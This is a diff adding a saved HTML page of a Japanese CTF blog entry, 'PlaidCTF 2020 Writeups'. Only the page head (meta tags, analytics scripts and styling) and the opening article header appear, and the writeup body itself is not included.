@@ -1,0 +1,1447 @@
+<!DOCTYPE html>
+<!-- saved from url=(0056)https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300 -->
+<html lang="ja" data-admin-domain="//blog.hatena.ne.jp" data-admin-origin="https://blog.hatena.ne.jp" data-author="ptr-yudai" data-avail-langs="ja en" data-blog="ptr-yudai.hatenablog.com" data-blog-host="ptr-yudai.hatenablog.com" data-blog-is-public="1" data-blog-name="CTFするぞ" data-blog-owner="ptr-yudai" data-blog-uri="https://ptr-yudai.hatenablog.com/" data-blog-uuid="10257846132615356977" data-blogs-uri-base="https://ptr-yudai.hatenablog.com" data-brand="hatenablog" data-data-layer="{&quot;hatenablog&quot;:{&quot;page_id&quot;:&quot;entry&quot;,&quot;analytics&quot;:{&quot;separated_property_id&quot;:&quot;UA-29716941-23&quot;,&quot;property_id&quot;:&quot;UA-136430147-1&quot;,&quot;brand_property_id&quot;:&quot;&quot;,&quot;non_sampling_property_id&quot;:&quot;&quot;},&quot;brand&quot;:&quot;hatenablog&quot;,&quot;admin&quot;:{},&quot;permalink_entry&quot;:{&quot;title&quot;:&quot;PlaidCTF 2020 Writeups&quot;,&quot;date&quot;:&quot;2020-04-20&quot;,&quot;hour&quot;:&quot;10&quot;,&quot;categories&quot;:&quot;&quot;,&quot;uri&quot;:&quot;https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300&quot;,&quot;author_name&quot;:&quot;ptr-yudai&quot;},&quot;router_type&quot;:&quot;blogs&quot;,&quot;blog&quot;:{&quot;owner_name&quot;:&quot;ptr-yudai&quot;,&quot;force_pc_view&quot;:&quot;true&quot;,&quot;enable_keyword_link&quot;:&quot;true&quot;,&quot;is_responsive_view&quot;:&quot;false&quot;,&quot;name&quot;:&quot;CTF\u3059\u308b\u305e&quot;,&quot;disable_ads&quot;:&quot;&quot;,&quot;content_seems_japanese&quot;:&quot;true&quot;,&quot;entry_show_footer_related_entries&quot;:&quot;true&quot;,&quot;uri&quot;:&quot;https://ptr-yudai.hatenablog.com/&quot;,&quot;lang&quot;:&quot;ja&quot;,&quot;is_public&quot;:&quot;true&quot;,&quot;enable_ads&quot;:&quot;true&quot;,&quot;is_sleeping&quot;:&quot;false&quot;},&quot;pro&quot;:&quot;free&quot;}}" data-device="pc" data-dont-recommend-pro="false" data-global-domain="https://hatenablog.com" data-globalheader-color="b" data-globalheader-type="pc" data-has-touch-view="1" data-no-suggest-touch-view="1" data-page="entry" data-parts-domain="https://hatenablog-parts.com" data-plus-available="" data-pro="false" data-router-type="blogs" data-sentry-dsn="https://03a33e4781a24cf2885099fed222b56d@sentry.io/1195218" data-sentry-environment="production" data-sentry-sample-rate="0.1" data-static-domain="https://cdn.blog.st-hatena.com" data-version="a59eb6324c63cc358e798135a57381d1" itemscope="" itemtype="http://schema.org/Article" data-initial-state="{}"><head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/pageviews"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/segment"></script><script async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/gtm(1).js"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/pageviews(1)"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/segment(1)"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/get"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/td-1.5.1.js"></script><script async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/tdim-1.1.0.min.js"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/gtm(2).js"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/audience"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/recaptcha__zh_tw.js"></script><script async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/notices.count.json"></script>
+  
+
+  
+
+
+
+  
+
+  <meta name="robots" content="max-image-preview:large">
+
+
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=7; IE=9; IE=10; IE=11">
+  <title>PlaidCTF 2020 Writeups - CTFするぞ</title>
+
+  
+  <link rel="canonical" href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300">
+
+
+
+  
+  
+
+<meta itemprop="name" content="PlaidCTF 2020 Writeups - CTFするぞ">
+
+  <meta itemprop="image" content="https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20200420/20200420105212.png">
+
+
+  <meta property="og:title" content="PlaidCTF 2020 Writeups - CTFするぞ">
+<meta property="og:type" content="article">
+  <meta property="og:url" content="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300">
+
+  <meta property="og:image" content="https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20200420/20200420105212.png">
+
+<meta property="og:image:alt" content="PlaidCTF 2020 Writeups - CTFするぞ">
+    <meta property="og:description" content="I played PlaidCTF in shibad0gs and reached 38th place. I&#39;m going to write up the challenges I solved during the CTF. I don&#39;t write about &quot;YOU wa SHOCKWAVE&quot; as I mostly guessed the flag. (It was about disassembling shockwave media --&gt; finding input which satisfies 21 equations.) [Pwnable 250pts] Emoj…">
+<meta property="og:site_name" content="CTFするぞ">
+
+  <meta property="article:published_time" content="1587347580">
+
+      <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20200420/20200420105212.png">  <meta name="twitter:title" content="PlaidCTF 2020 Writeups - CTFするぞ">    <meta name="twitter:description" content="I played PlaidCTF in shibad0gs and reached 38th place. I&#39;m going to write up the challenges I solved during the CTF. I don&#39;t write about &quot;YOU wa SHOCKWAVE&quot; as I…">  <meta name="twitter:app:name:iphone" content="はてなブログアプリ">
+  <meta name="twitter:app:id:iphone" content="583299321">
+  <meta name="twitter:app:url:iphone" content="hatenablog:///open?uri=https%3A%2F%2Fptr-yudai.hatenablog.com%2Fentry%2F2020%2F04%2F20%2F105300">
+  
+    <meta name="description" content="I played PlaidCTF in shibad0gs and reached 38th place. I&#39;m going to write up the challenges I solved during the CTF. I don&#39;t write about &quot;YOU wa SHOCKWAVE&quot; as I mostly guessed the flag. (It was about disassembling shockwave media --&gt; finding input which satisfies 21 equations.) [Pwnable 250pts] Emoj…">
+    <meta name="keywords" content="ctf,writeup">
+
+
+  
+<script src="./PlaidCTF 2020 Writeups - CTFするぞ_files/sdk.js" async="" crossorigin="anonymous"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/analytics.js"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/js"></script><script id="facebook-jssdk" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/sdk(1).js"></script><script async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/gtm.js"></script><script id="embed-gtm-data-layer-loader" data-data-layer-page-specific="{&quot;hatenablog&quot;:{&quot;blogs_permalink&quot;:{&quot;has_related_entries_with_elasticsearch&quot;:&quot;false&quot;,&quot;is_blog_sleeping&quot;:&quot;false&quot;,&quot;blog_hide_afc_func&quot;:&quot;false&quot;,&quot;entry_afc_issued&quot;:&quot;false&quot;,&quot;is_author_pro&quot;:&quot;false&quot;,&quot;blog_afc_issued&quot;:&quot;false&quot;,&quot;blog_struct_hide_afc&quot;:&quot;false&quot;,&quot;brand_hide_afc&quot;:&quot;false&quot;,&quot;blog_hide_afc_field&quot;:&quot;false&quot;}}}">
+(function() {
+  function loadDataLayer(elem, attrName) {
+    if (!elem) { return {}; }
+    var json = elem.getAttribute(attrName);
+    if (!json) { return {}; }
+    return JSON.parse(json);
+  }
+
+  var globalVariables = loadDataLayer(
+    document.documentElement,
+    'data-data-layer'
+  );
+  var pageSpecificVariables = loadDataLayer(
+    document.getElementById('embed-gtm-data-layer-loader'),
+    'data-data-layer-page-specific'
+  );
+
+  var variables = [globalVariables, pageSpecificVariables];
+
+  if (!window.dataLayer) {
+    window.dataLayer = [];
+  }
+
+  for (var i = 0; i < variables.length; i++) {
+    window.dataLayer.push(variables[i]);
+  }
+})();
+</script>
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P4CXTW');</script>
+<!-- End Google Tag Manager -->
+
+
+
+
+  <link rel="shortcut icon" href="https://ptr-yudai.hatenablog.com/favicon">
+<link rel="apple-touch-icon" href="https://cdn.image.st-hatena.com/image/apple_touch_icon/03f8aec7521797052b92a82c3aa5476b76a664a2/version=1/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F153103571%2F1535456424487441">
+<link rel="icon" sizes="192x192" href="https://cdn.image.st-hatena.com/image/square/6436cdc2323409426df33d5793a2af667aa90090/backend=imagemagick;height=192;version=1;width=192/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F153103571%2F1535456424487441">
+
+  
+
+<link rel="alternate" type="application/atom+xml" title="Atom" href="https://ptr-yudai.hatenablog.com/feed">
+<link rel="alternate" type="application/rss+xml" title="RSS2.0" href="https://ptr-yudai.hatenablog.com/rss">
+<link rel="alternate" type="application/json+oembed" href="https://hatenablog.com/oembed?url=https%3A%2F%2Fptr-yudai.hatenablog.com%2Fentry%2F2020%2F04%2F20%2F105300&amp;format=json" title="oEmbed Profile of PlaidCTF 2020 Writeups">
+<link rel="alternate" type="text/xml+oembed" href="https://hatenablog.com/oembed?url=https%3A%2F%2Fptr-yudai.hatenablog.com%2Fentry%2F2020%2F04%2F20%2F105300&amp;format=xml" title="oEmbed Profile of PlaidCTF 2020 Writeups">
+  
+  <link rel="author" href="http://www.hatena.ne.jp/ptr-yudai/">
+
+  
+
+
+  
+    <link rel="stylesheet" type="text/css" href="./PlaidCTF 2020 Writeups - CTFするぞ_files/blog.css">
+
+    
+  <link rel="stylesheet" type="text/css" href="./PlaidCTF 2020 Writeups - CTFするぞ_files/ba33113b932b961650ef636dc65c49ba7998551f">
+  
+
+  
+
+  
+<script> </script>
+
+  
+<style>
+  div#google_afc_user,
+  div.google-afc-user-container,
+  div.google_afc_image,
+  div.google_afc_blocklink {
+      display: block !important;
+  }
+</style>
+
+
+  
+    <script src="./PlaidCTF 2020 Writeups - CTFするぞ_files/valve.js" async=""></script>
+<script id="test-valve-definition">
+  var valve = window.valve || [];
+
+  valve.push(function(v) {
+    v.config({
+      service: 'blog',
+      content: {
+        result: 'ng',
+        documentIds: ["blog:entry:26006613553054609"]
+      }
+    });
+    v.defineDFPSlot({"lazy":"","sizes":[[300,250],[336,280],[468,60],"fluid"],"slotId":"google_afc_user_container_0","unit":"/4374287/blog_user"});
+    v.sealDFPSlots();
+  });
+</script>
+
+  
+
+  <script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/MathJax.js">
+</script>
+<script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/apstag.js"></script><style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
+.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
+.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
+.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
+</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_About.MathJax_MousePost {outline: none}
+.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 5px 0px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 5px; -webkit-border-radius: 5px; -moz-border-radius: 5px; -khtml-border-radius: 5px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+.MathJax_MenuItem {padding: 1px 2em; background: transparent}
+.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
+.MathJax_MenuActive .MathJax_MenuArrow {color: white}
+.MathJax_MenuArrow.RTL {left: .5em; right: auto}
+.MathJax_MenuCheck {position: absolute; left: .7em}
+.MathJax_MenuCheck.RTL {right: .7em; left: auto}
+.MathJax_MenuRadioCheck {position: absolute; left: .7em}
+.MathJax_MenuRadioCheck.RTL {right: .7em; left: auto}
+.MathJax_MenuLabel {padding: 1px 2em 3px 1.33em; font-style: italic}
+.MathJax_MenuRule {border-top: 1px solid #DDDDDD; margin: 4px 3px}
+.MathJax_MenuDisabled {color: GrayText}
+.MathJax_MenuActive {background-color: #606872; color: white}
+.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
+.MathJax_ContextMenu:focus {outline: none}
+.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
+#MathJax_AboutClose {top: .2em; right: .2em}
+.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
+.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
+.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
+.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_MenuClose:hover span {background-color: #CCC!important}
+.MathJax_MenuClose:hover:focus {outline: none}
+</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
+</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
+.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
+</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
+#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+</style><style type="text/css">.MathJax_Preview {color: #888}
+#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
+#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
+.MathJax_Error {color: #CC0000; font-style: italic}
+</style><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/itm.js"></script><style type="text/css">.MJXp-script {font-size: .8em}
+.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
+.MJXp-bold {font-weight: bold}
+.MJXp-italic {font-style: italic}
+.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-largeop {font-size: 150%}
+.MJXp-largeop.MJXp-int {vertical-align: -.2em}
+.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
+.MJXp-display {display: block; text-align: center; margin: 1em 0}
+.MJXp-math span {display: inline-block}
+.MJXp-box {display: block!important; text-align: center}
+.MJXp-box:after {content: " "}
+.MJXp-rule {display: block!important; margin-top: .1em}
+.MJXp-char {display: block!important}
+.MJXp-mo {margin: 0 .15em}
+.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
+.MJXp-denom {display: inline-table!important; width: 100%}
+.MJXp-denom > * {display: table-row!important}
+.MJXp-surd {vertical-align: top}
+.MJXp-surd > * {display: block!important}
+.MJXp-script-box > *  {display: table!important; height: 50%}
+.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
+.MJXp-script-box > *:last-child > * {vertical-align: bottom}
+.MJXp-script-box > * > * > * {display: block!important}
+.MJXp-mphantom {visibility: hidden}
+.MJXp-munderover, .MJXp-munder {display: inline-table!important}
+.MJXp-over {display: inline-block!important; text-align: center}
+.MJXp-over > * {display: block!important}
+.MJXp-munderover > *, .MJXp-munder > * {display: table-row!important}
+.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
+.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
+.MJXp-mtr {display: table-row!important}
+.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
+.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-mlabeledtr {display: table-row!important}
+.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
+.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
+.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
+.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
+.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
+.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
+.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
+.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
+.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
+.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
+.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
+.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
+</style><script charset="utf-8" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/button.93a0c25c2d2f3081c705c98c2d9dec0e.js"></script><script type="text/javascript" async="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/hatena_bigmining.js"></script><script src="./PlaidCTF 2020 Writeups - CTFするぞ_files/entries.json" type="text/javascript"></script><style type="text/css">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, "hiragino kaku gothic pro",meiryo,"ms pgothic",sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
+.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}</style></head><style id="stylish-2" class="stylish" type="text/css">/* -=< Darker userstyles.org by Zigboom Designs >=- */
+
+
+@namespace url(http://www.w3.org/1999/xhtml);</style>
+
+  <body class="page-entry"><div id="MathJax_Message" style="display: none;"></div>
+    
+
+    <div id="globalheader-container" data-brand="hatenablog">
+  <iframe id="globalheader" height="37" frameborder="0" allowtransparency="true" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/saved_resource.html"></iframe>
+</div>
+
+
+    <div id="container">
+      <div id="container-inner">
+        <header id="blog-title" data-brand="hatenablog">
+  <div id="blog-title-inner">
+    <div id="blog-title-content">
+      <h1 id="title"><a href="https://ptr-yudai.hatenablog.com/">CTFするぞ</a></h1>
+      
+        <h2 id="blog-description">CTF以外のことも書くよ</h2>
+      
+    </div>
+  </div>
+</header>
+
+        
+
+        
+        
+
+
+
+
+<div id="content" class="hfeed">
+  <div id="content-inner">
+    <div id="wrapper">
+      <div id="main">
+        <div id="main-inner">
+          
+
+
+          
+  
+  <!-- google_ad_section_start -->
+  <!-- rakuten_ad_target_begin -->
+  
+  
+  
+
+  
+
+  
+    
+      
+        <article class="entry hentry test-hentry js-entry-article date-first autopagerize_page_element chars-9200 words-1400 mode-markdown entry-odd" id="entry-26006613553054609" data-keyword-campaign="" data-uuid="26006613553054609" data-publication-type="entry">
+  <div class="entry-inner">
+    <header class="entry-header">
